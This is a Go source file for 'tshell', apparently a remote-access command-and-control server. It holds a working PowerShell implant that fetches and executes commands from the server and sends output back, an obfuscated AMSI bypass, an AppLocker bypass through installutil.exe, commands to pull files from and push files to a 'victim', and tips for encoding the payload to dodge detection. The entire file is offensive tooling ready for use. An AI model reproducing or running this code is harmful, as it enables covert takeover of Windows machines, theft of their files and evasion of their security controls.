package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
)

var (
	sessionActive  = make(map[int]chan string, 0)
	currentSession int
	addr           = ""
	currentJob     = ""
	destPath       = ""
	rCMD           = regexp.MustCompile(`("[^"]*"|[^"\s]+)(\s+|$)`)
)

const (
	PAYLOAD        = `powershell -Command "& {$i=Get-Random;$s='{{addr}}/echo';$p='C:\windows\temp\hihi';while ($true){try {rm $p'.*';try{$d=iex((Invoke-WebRequest -Headers @{'hiid' = $i} -UseBasicParsing -Uri $s).Content)}catch{$d=$Error[0]};$d|Out-File -FilePath $p'.txt';Compress-Archive -Path $p'.txt' -DestinationPath $p'.zip' -Force;$b=@{'FileName' = Get-Content($p+'.zip') -Raw};$t=(Invoke-WebRequest -Method POST -UseBasicParsing -Headers @{'hiid' = $i} -Uri $s -InFile $p'.zip')}catch {Start-Sleep -Seconds 5}}}"`
	TSHELL_COMMAND = "tshell "
)

func getId(r *http.Request) int {
	id, _ := strconv.Atoi(r.Header.Get("hiid"))
	return id
}

func echo(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		id := getId(r)
		if id <= 0 {
			return
		}

		_, found := sessionActive[id]
		if !found {
			log.Println("connected from", r.RemoteAddr)
			sessionActive[id] = make(chan string, 0)
		}

		c := sessionActive[id]
		w.Write([]byte(<-c))
		return
	} else if r.Method == http.MethodPost {
		id := getId(r)
		if id <= 0 {
			return
		}

		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Println(err)
			return
		}
		defer r.Body.Close()

		zipReader, err := zip.NewReader(bytes.NewReader(body), int64(len(body)))
		if err != nil {
			log.Println(err)
			return
		}

		for _, zipFile := range zipReader.File {
			f, err := zipFile.Open()
			if err != nil {
				log.Println(err)
				return
			}
			defer f.Close()
			b, err := ioutil.ReadAll(f)
			if err != nil {
				log.Println(err)
				return
			}
			fmt.Println(string(b))
			fmt.Printf("[%d]: ", id)
		}
	}
}

func home(w http.ResponseWriter, r *http.Request) {
	id := getId(r)
	arr := strings.Split(r.URL.Path, "/")
	defer r.Body.Close()

	if currentJob == "" || id <= 0 || len(arr) < 3 || r.Method != http.MethodPost {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	typeJob := arr[1]

	whatJob := fmt.Sprintf("%s-%d-%s", typeJob, currentSession, arr[2])
	if whatJob != currentJob {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	switch typeJob {
	case "recv":
		out, err := os.Create(destPath)
		if err != nil {
			log.Println(err)
			return
		}
		defer out.Close()
		_, err = io.Copy(out, r.Body)
		if err != nil {
			log.Println(err)
			return
		}
		fmt.Println("Download File Successful!")
		reset()
	case "send":
		fileBytes, err := ioutil.ReadFile(destPath)
		if err != nil {
			log.Println(err)
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Header().Set("Content-Type", "text/plain")
		w.Write(fileBytes)
		fmt.Println("Upload File Successful!")
		reset()
	}

}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("use: tshell 192.168.x.y:80")
		return
	}

	addr = os.Args[1]
	http.HandleFunc("/echo", echo)
	http.HandleFunc("/", home)

	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Printf("[%d]: ", currentSession)
			text, err := reader.ReadString('\n')
			if err != nil {
				panic(err)
			}
			text = strings.TrimSpace(text)
			if strings.HasPrefix(text, TSHELL_COMMAND) {
				tshell(strings.Replace(text, TSHELL_COMMAND, "", 1))
			} else {
				sendCommand(text)
			}

		}
	}()

	err := http.ListenAndServe(addr, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
func sendCommand(cmd string) {
	if currentSession <= 0 {
		fmt.Println("Please choose session id first")
	} else {
		sessionActive[currentSession] <- cmd
	}
}

func genUUID() (uuid string) {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		panic(err)
	}
	uuid = fmt.Sprintf("%X%X%X%X%X", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
	return
}

func reset() {
	currentJob = ""
	destPath = ""
}

func parseCmd(cmd string) (string, []string) {
	cmds := rCMD.FindAllString(cmd, -1)
	for k, v := range cmds {
		cmds[k] = strings.TrimSpace(v)
	}

	if len(cmds) == 1 {
		return cmds[0], nil
	}
	return cmds[0], cmds[1:]
}

func printHelp() {
	fmt.Println(TSHELL_COMMAND)
	fmt.Println("List Commands")
	fmt.Println("=============")
	fmt.Println("sessions: List all sessions")
	fmt.Println("payload: show powershell payload")
	fmt.Println("session: Choose session id to control. Ex: session <number>")
	fmt.Println("amsi: amsi bypass")
	fmt.Println("applocker: applocker bypass. Ex applocker <binary path>")
	fmt.Println("download: download file from victim. Ex: download <remote path> <local path>")
	fmt.Println("upload: upload file to victim. Ex: upload <remote path> <local path>")
}

func tshell(cmd string) {
	fun, agrs := parseCmd(cmd)
	switch fun {
	case "help":
		printHelp()
	case "sessions":
		fmt.Println("List sessions:")
		for s, _ := range sessionActive {
			fmt.Println("- ", s)
		}
	case "amsi":
		sendCommand(`$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u));$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static');$field.SetValue($null,$true);echo "success!"`)
	case "payload":
		fmt.Println(strings.Replace(PAYLOAD, `{{addr}}`, "http://"+addr, 1))
		fmt.Println("for encode:  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(<payload>)")
		fmt.Println(`and run: powershell -EncodedCommand "<payload encoded>"`)
	case "session":
		if len(agrs) < 1 {
			fmt.Println("session <id>")
			return
		}
		selectId, _ := strconv.Atoi(strings.TrimSpace(agrs[0]))
		if selectId <= 0 {
			fmt.Println("Please choose session id")
		} else {
			_, found := sessionActive[selectId]
			if !found {
				fmt.Println("Sessions id", selectId, "not found")
			} else {
				currentSession = selectId
			}
		}
	case "download":
		if len(agrs) < 2 {
			fmt.Println("download <remote path> <local path>")
			return
		}
		remotePath := agrs[0]
		localPath := agrs[1]
		newId := genUUID()

		currentJob = fmt.Sprintf("recv-%d-%s", currentSession, newId)
		destPath = localPath

		cmd_download := `Invoke-RestMethod -Headers @{'hiid' = $i} -UseBasicParsing -Uri http://` + addr + `/recv/` + newId + ` -Method Post -InFile ` + remotePath
		sendCommand(cmd_download)
	case "upload":
		if len(agrs) < 2 {
			fmt.Println("upload <remote path> <local path>")
			return
		}
		remotePath := agrs[0]
		localPath := agrs[1]
		newId := genUUID()

		currentJob = fmt.Sprintf("send-%d-%s", currentSession, newId)
		destPath = localPath
		cmd_download := `Invoke-WebRequest -Headers @{'hiid' = $i} -UseBasicParsing -Uri http://` + addr + `/send/` + newId + ` -Method Post -OutFile ` + remotePath
		sendCommand(cmd_download)
	case "applocker":
		if len(agrs) < 1 {
			fmt.Println("applocker <binary path>")
			return
		}
		sendCommand(`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U ` + agrs[0])
	default:
		printHelp()
	}
}
